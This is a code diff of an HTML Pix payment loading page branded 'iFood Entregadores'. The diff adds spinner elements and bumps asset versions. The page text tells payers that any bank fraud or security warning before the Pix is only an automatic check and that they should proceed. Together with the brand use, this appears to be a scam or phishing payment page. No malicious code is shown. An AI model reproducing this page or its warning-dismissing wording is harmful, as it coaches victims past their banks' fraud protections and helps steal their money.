@@ -9,7 +9,7 @@
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="style.css?v=11.0">
+    <link rel="stylesheet" href="style.css?v=11.1">
 </head>
 <body data-page="pix-loading">
     <noscript class="no-js">Para continuar, ative o JavaScript no navegador.</noscript>
@@ -21,11 +21,12 @@
             </div>
 
             <div class="pix-loading-card">
-                <div class="pix-loading-spinner" aria-hidden="true">
-                    <span></span>
+                <div id="pix-loading-spinner" class="pix-loading-spinner" aria-hidden="true">
+                    <span class="pix-loading-spinner-ring"></span>
+                    <span class="pix-loading-spinner-check"></span>
                 </div>
 
-                <span class="pix-loading-kicker">Pix sendo gerado</span>
+                <span id="pix-loading-kicker" class="pix-loading-kicker" aria-live="polite">Pix sendo gerado</span>
                 <h1>Confira o nome antes de pagar</h1>
                 <p class="pix-loading-copy">
                     Seu banco pode mostrar um aviso de fraude ou seguranca antes do Pix. Isso e uma verificacao automatica. Confira o nome abaixo no aplicativo do banco e continue somente se o recebedor for o mesmo.
@@ -72,6 +73,6 @@
         <p>&copy; 2026 iFood Entregadores. Todos os direitos reservados.</p>
     </footer>
 
-    <script src="script.js?v=11.0" defer></script>
+    <script src="script.js?v=11.1" defer></script>
 </body>
 </html>
